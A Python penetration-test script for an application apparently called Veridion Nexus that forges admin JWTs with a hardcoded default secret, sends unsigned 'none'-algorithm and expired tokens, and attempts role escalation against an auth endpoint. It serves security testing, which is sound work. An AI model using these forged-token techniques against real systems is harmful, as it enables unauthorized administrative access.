#!/usr/bin/env python3
"""
JWT Secret Exploitation Test
Tests for default JWT secret vulnerability (CVE-2025-VN-001)
"""
import jwt
import requests
import sys
import json
from datetime import datetime, timedelta

# Default secret from code
DEFAULT_SECRET = "your-secret-key-change-in-production"

def test_default_secret(base_url="http://localhost:8080"):
    """Test if default JWT secret is in use"""
    print("[*] Testing for default JWT secret...")
    
    # Create admin token with default secret
    exp_time = datetime.utcnow() + timedelta(hours=24)
    token = jwt.encode({
        'sub': '00000000-0000-0000-0000-000000000001',
        'username': 'admin',
        'roles': ['admin'],
        'exp': int(exp_time.timestamp()),
        'iat': int(datetime.utcnow().timestamp())
    }, DEFAULT_SECRET, algorithm='HS256')
    
    # Test token on /api/v1/auth/me endpoint
    headers = {'Authorization': f'Bearer {token}'}
    try:
        response = requests.get(f'{base_url}/api/v1/auth/me', headers=headers, timeout=5)
        
        if response.status_code == 200:
            print("[!] CRITICAL: Default JWT secret is in use!")
            print(f"[+] Token accepted: {token[:50]}...")
            print(f"[+] Response: {json.dumps(response.json(), indent=2)}")
            return True
        else:
            print(f"[-] Default secret not in use (status: {response.status_code})")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False

def test_token_manipulation(base_url="http://localhost:8080"):
    """Test JWT token manipulation attacks"""
    print("\n[*] Testing JWT token manipulation...")
    
    # Test 1: No signature (algorithm: none)
    try:
        token_none = jwt.encode({
            'sub': '00000000-0000-0000-0000-000000000001',
            'username': 'admin',
            'roles': ['admin'],
            'exp': 9999999999,
            'iat': 1000000000
        }, '', algorithm='none')
        
        headers = {'Authorization': f'Bearer {token_none}'}
        response = requests.get(f'{base_url}/api/v1/auth/me', headers=headers, timeout=5)
        
        if response.status_code == 200:
            print("[!] VULNERABLE: Algorithm 'none' accepted!")
            return True
    except Exception as e:
        print(f"[-] Algorithm 'none' rejected (good): {e}")
    
    # Test 2: Expired token
    exp_time = datetime.utcnow() - timedelta(hours=1)
    token_expired = jwt.encode({
        'sub': '00000000-0000-0000-0000-000000000001',
        'username': 'admin',
        'roles': ['admin'],
        'exp': int(exp_time.timestamp()),
        'iat': int((datetime.utcnow() - timedelta(hours=2)).timestamp())
    }, DEFAULT_SECRET, algorithm='HS256')
    
    headers = {'Authorization': f'Bearer {token_expired}'}
    response = requests.get(f'{base_url}/api/v1/auth/me', headers=headers, timeout=5)
    
    if response.status_code == 200:
        print("[!] VULNERABLE: Expired token accepted!")
        return True
    else:
        print("[-] Expired token correctly rejected")
    
    return False

def test_role_escalation(base_url="http://localhost:8080", valid_token=None):
    """Test role escalation attempts"""
    print("\n[*] Testing role escalation...")
    
    if not valid_token:
        print("[-] Need valid token for role escalation test")
        return False
    
    # Decode token and modify roles
    try:
        decoded = jwt.decode(valid_token, options={"verify_signature": False})
        print(f"[*] Original roles: {decoded.get('roles', [])}")
        
        # Try to add admin role
        decoded['roles'] = ['admin', 'viewer']
        new_token = jwt.encode(decoded, DEFAULT_SECRET, algorithm='HS256')
        
        headers = {'Authorization': f'Bearer {new_token}'}
        response = requests.get(f'{base_url}/api/v1/auth/me', headers=headers, timeout=5)
        
        if response.status_code == 200:
            user_data = response.json()
            if 'admin' in user_data.get('roles', []):
                print("[!] VULNERABLE: Role escalation possible!")
                return True
    except Exception as e:
        print(f"[-] Role escalation test failed: {e}")
    
    return False

if __name__ == '__main__':
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    
    print("=" * 60)
    print("JWT Penetration Test - Veridion Nexus")
    print("=" * 60)
    
    # Test 1: Default secret
    default_secret_vuln = test_default_secret(base_url)
    
    # Test 2: Token manipulation
    token_manip_vuln = test_token_manipulation(base_url)
    
    # Test 3: Role escalation (if we have a valid token)
    if default_secret_vuln:
        role_escalation_vuln = test_role_escalation(base_url)
    
    print("\n" + "=" * 60)
    print("Test Summary:")
    print(f"  Default Secret Vulnerable: {'YES' if default_secret_vuln else 'NO'}")
    print(f"  Token Manipulation Vulnerable: {'YES' if token_manip_vuln else 'NO'}")
    print("=" * 60)

